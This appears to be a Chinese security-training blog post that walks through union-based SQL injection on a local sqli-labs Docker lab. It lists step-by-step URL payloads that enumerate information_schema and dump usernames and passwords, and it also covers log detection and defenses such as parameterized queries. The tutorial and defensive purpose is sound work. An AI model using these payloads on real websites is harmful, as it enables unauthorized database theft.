#  靶场实战09|一条 URL 窃取全库数据，SQL 注入漏洞靶场实操（Docker 一键搭建）  
原创 安全值班室
                    安全值班室  安全值班室   2026-09-25 01:00  
  
今天进入整张专辑含金量最高的模块——SQL注入。这个漏洞连续十几年霸榜OWASP Top 10，至今仍是攻防演练里出场率最高的漏洞之一。这一章只干一件事：**用联合查询，把数据库里的用户表完整拖出来。**  
  
01 / 环境搭建：一条命令起靶场  
  
本章用sqli-labs，它是专门为练习SQL注入设计的靶场，Less-1到Less-4正好覆盖联合查询全流程。其中Less-1是字符型注入、Less-2是数字型注入，两者  
  
只差一个引号，新手最容易混淆，所以必须亲手各打一遍。  
```
# 拉取sqli-labs镜像（国内代理源，下载快）
docker pull docker.1ms.run/acgpiano/sqli-labs
# 启动容器，容器80端口映射到本机8080
docker run -d --name sqli-labs -p 8080:80 docker.1ms.run/acgpiano/sqli-labs
# 打开初始化页，点击 Setup/Reset Database 完成建库（Linux）
xdg-open http://localhost:8080
# Windows 直接浏览器访问：http://localhost:8080
```  
  
为什么选它：sqli-labs每个Less就是一个独立注入场景，报错信息完整、难度递进，是公认的入门靶场。Less-1源码只有十几行，很容易理解注入原理。  
  
 避坑指南  
  
1. **8080端口被占用：**  
启动报错 Bind for 0.0.0.0:8080 failed: port is already allocated。说明本机已有程序占用8080，换一个端口重启容器即可：docker run -d --name sqli-labs -p 8081:80 镜像名。2. **访问Less-1报 No database selected：**  
首次访问必须先打开首页，点击 Setup/Reset Database 完成建库，否则靶场没有可用数据库。3. **docker命令权限不足：**  
报 permission denied，用 sudo 执行，或执行 usermod -aG docker $USER 把当前用户加入docker组后重新登录。  
  
02 / 模拟攻击：五步拖出用户表  
  
目标：http://localhost:8080/Less-1/?id=1 是一个根据id查询用户信息的页面。我们要做的就是从id参数入手，一步步把数据库结构摸清，最后拿到users表的数据。  
  
 第一步：判断注入点（加一个引号看反应）  
```
# 正常请求，页面正常返回数据
http://localhost:8080/Less-1/?id=1
# 加一个单引号：页面立刻报SQL语法错误，存在注入点
http://localhost:8080/Less-1/?id=1'
```  
  
单引号是SQL字符串的边界符。如果后端把id直接拼进SQL语句，多出来的引号会让语句提前闭合，数据库解析失败就会报错——**这个报错就是注入点存在的证据。**  
如果没有报错，说明输入被安全处理了，就该换下一个点。  
  
 第二步：order by 猜列数  
```
# order by 3 正常返回 → 查询字段至少3列
http://localhost:8080/Less-1/?id=1' order by 3--+
# order by 4 报错 Unknown column '4' in 'order clause' → 确定一共3列
http://localhost:8080/Less-1/?id=1' order by 4--+
```  
  
union select要求前后查询列数一致，所以先要知道目标有几列。order by N让数据库按第N列排序，N超过总列数就报错。结尾的 --+ 是SQL注释符，注释掉后面多余的SQL，防止语法错误。  
  
 第三步：union select 找回显位  
```
# id改为-1，使前面查询无结果，执行union联合查询
http://localhost:8080/Less-1/?id=-1' union select 1,2,3--+
# 页面回显2和3 → 第2、3列可将查询结果输出到页面
```  
  
为什么用-1：union会把两次查询结果合并显示，前查询有结果时页面显示的是第一段数据，看不到union后面的内容。把id设成-1，前查询返回空，union的数据就顶上来了。列里填数字，页面显示哪个数字，哪一列就能回显数据——这就是回显位。  
  
 第四步：爆库名、表名  
```
# database() 查看当前数据库名，页面回显 security
http://localhost:8080/Less-1/?id=-1' union select 1,database(),3--+
# 查询security库中所有表，group_concat合并多行数据便于页面回显
http://localhost:8080/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
# 返回表列表中可找到 users 表
```  
  
information_schema是MySQL自带的元数据库，里面记录着所有库、表、字段的信息，是SQL注入拖库的地图。先查库名，再查表名，下一步查字段名，一步步逼近敏感数据。  
  
 第五步：拖数据（敏感信息打码演示）  
```
# 查询users表，将username与password拼接一次性导出
http://localhost:8080/Less-1/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```  
  
0x3a是冒号的十六进制写法，把用户名和密码拼成一行。到此完整拖库链路就通了：库名→表名→字段名→数据。真实环境里攻击者拿到密码后还会继续爆破弱口令、横向移动，但作为演示我们到这里就停，**所有实验仅限本地靶场。**  
注意观察响应包：一次成功的union注入，返回长度通常比正常请求明显变大。  
  
03 / 日志分析：注入攻击在日志里长什么样  
  
这是靶场Apache记录的访问日志（脱敏）。攻击者从探测到拖库，前后只花了6秒。  
```
# Apache访问日志（URL编码后的注入请求记录）
[REDACTED]--[28/Aug/2026:14:03:11+0800]"GET /Less-1/?id=1 HTTP/1.1" 200 1432
[REDACTED]--[28/Aug/2026:14:03:11+0800]"GET /Less-1/?id=1%27%20order%20by%203--+ HTTP/1.1" 200 1455
[REDACTED]--[28/Aug/2026:14:03:12+0800]"GET /Less-1/?id=1%27%20order%20by%204--+ HTTP/1.1" 200 1560
[REDACTED]--[28/Aug/2026:14:03:15+0800]"GET /Less-1/?id=-1%27%20union%20select%201,2,3--+ HTTP/1.1" 200 1587
[REDACTED]--[28/Aug/2026:14:03:16+0800]"GET /Less-1/?id=-1%27%20union%20select%201,database(),3--+ HTTP/1.1" 200 1612
```  
  
 判断标准：为什么这是真实攻击而不是误报  
  
1. **URL参数里出现SQL特征：**  
%27是单引号的URL编码，后面跟着order by、union、select、--+，正常用户绝不会这样传参，这是最硬的证据。2. **同一秒内连续高频请求、只改id参数：**  
几秒内对同一URL发起一串只有参数不同的请求，是手工或工具探测的特征。3. **参数值在业务上不合理：**  
id=-1在任何正常业务里都不存在，却出现在请求里，说明是构造的payload。4. **响应长度规律性变化：**  
1432→1455→1560→1587→1612，攻击者在根据回显逐轮调整payload，长度变化说明探测正在生效。  
  
逐行解读  
  
第一行：id=1正常请求，攻击者先确认页面基线。第二行：order by 3，返回200，列数至少3列，探测成功。第三行：立刻试order by 4，响应长度变大——数据库报了Unknown column错误，攻击者由此确定列数正好是3。第四行：union select 1,2,3出现且id改为-1，开始找回显位。第五行：union select里出现database()函数，攻击者已拿到库名，进入拖库阶段。整个过程几秒内完成，单看一行可能只是普通访问，**把同一来源的连续请求串起来，攻击链非常清晰。**  
这也是防守方要关注同一IP短时高频+参数异常组合特征的原因。  
  
04 / 如何防护：从根上堵住拼接  
  
 先讲原理：为什么这个攻击能成功  
  
根本原因只有一个：**代码把用户输入直接拼进了SQL语句字符串。**  
引号、order by、union、注释符都只是表达方式，真正的洞是字符串拼接。当输入变成了SQL语法的一部分，数据库就无法区分哪些是数据、哪些是代码，注入就发生了。  
  
 基础级（必须做）：参数化查询  
```
// PHP PDO 预处理语句：输入仅作为「值」，不会被解析为SQL代码
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$_GET['id']]);
```  
  
参数化查询把SQL结构和数据分开传递，数据库先编译语句结构，再绑定数据，无论输入什么，都只会被当作一个字符串值，**从语法层面消灭注入。**  
这是唯一治本的方案，Java的PreparedStatement、Python的sqlite3参数占位符同理。  
  
 进阶级（推荐）：让攻击者拿到也拖不动  
  
1. **数据库账号最小权限：**  
Web应用只连接一个仅有SELECT权限的账号，即使被注入也查不了information_schema、拖不了其它库。2. **关闭错误回显：**  
生产环境display_errors设为Off，攻击者看不到SQL报错，判断注入点的难度大增。3. **输入校验：**  
id这种参数用intval()强转数字，非数字直接变0，从源头掐死注入输入。  
  
 专家级（纵深防御）  
  
1. WAF规则拦截union select、information_schema等明显特征，作为第一道门。2. 数据库开启审计日志+敏感字段加密，检测异常查询并溯源。3. 上线前用sqlmap自动化扫描+人工代码审计双重把关，把漏洞拦在发布之前。记住：**WAF是兜底不是依靠，参数化才是根。**  
任何绕过WAF的手段，在参数化查询面前都会失效。  
  
05 / 总结复盘  
  
 本章要点（新手必须记住）  
  
1. 判断注入点最快的方法：参数后加一个单引号，报错即存在。2. order by N 数列数，union select两边的列数必须一致。3. id=-1 让前查询无结果，union后的数据才能回显到页面。4. information_schema是MySQL的元数据库，拖库全靠它查库名、表名、字段名。5. 根本防御是参数化查询，其它手段都是辅助。  
  
 攻击链全景  
  
加引号判断注入点 → order by数列数 → union select找回显位 → information_schema爆库名/表名/字段名 → 拖数据。这条链是后续所有注入变种的地基，盲注、报错注入、堆叠注入都是在这个框架上换"表达方式"。  
  
 面试可能怎么问 + 回答思路  
  
问：SQL注入的原理是什么？答：用户输入未经过滤直接拼接进SQL语句，输入被当作SQL代码执行，攻击者可以操纵查询逻辑获取敏感数据。问：union注入为什么要把id设成-1？答：让前面的查询返回空集，union后的查询结果才能显示在页面上。问：如何彻底防御SQL注入？答：参数化查询是根本，配合最小权限账号、关闭错误回显、WAF做纵深防御。  
  
下一章进入盲注。当页面不再回显任何数据、连报错都看不到时，只能靠页面的true/false差异或者时间延迟来猜数据库内容——那才是真正考验耐心的时刻，我们下章见。  
  
**关注我，下期不迷路**  
  
  
**MORE**  
  
往期回顾  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJd2VWNzn1zwES9wep9zXMxpd4pzZEX5A2auqIDHXxKQu4mTJjniatK47ib7967dK4mN09zS0mUGlx3yVJdDA9Oty2xsADqJnUGT4/640?wx_fmt=gif&from=appmsg "")  
  
[CTF新手速成](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4616106042689814529#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJeAFe1tsVmCstoS3GUZ4ZjVQ4jz1Diawnx3CwB8yTlRmDGpK87xGlKVgticyM802YDmck0NdeAZb8u5IdHW2NMK3DgzSyapgiaHhg/640?wx_fmt=gif&from=appmsg "")  
  
[靶场实战：从漏洞基础到红队综合](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4694391088487563265#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ZNdOU6xPdJdeDc9RodEDdrwONAFutCzMLCRuQ9OArXOzQhRTMl9ALSeICh3S5pR88veNF5iaQ5MJKhSPibx156OibdfRWEls16qEiajUDZE3juE/640?wx_fmt=gif&from=appmsg "")  
  
[内网渗透学习路线](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4572157479522107394#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJfj1YSdkgqeicpsicCDlBHcAC5Q36YsAtcicZdr9WXT2gh8WDicPUbcHBoibYr5ph4LIFMJ1hibHZ8IfBSTjDkE6PfEmg4eXLnggFeQU/640?wx_fmt=gif&from=appmsg "")  
  
[云安全攻防实战连载](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4544879677747986438#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ZNdOU6xPdJeAFe1tsVmCstoS3GUZ4ZjVQ4jz1Diawnx3CwB8yTlRmDGpK87xGlKVgticyM802YDmck0NdeAZb8u5IdHW2NMK3DgzSyapgiaHhg/640?wx_fmt=gif&from=appmsg "")  
  
[Web安全学习路线](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg3MzczMDc0OQ==&action=getalbum&album_id=4534863005871931394#wechat_redirect)  
  
  
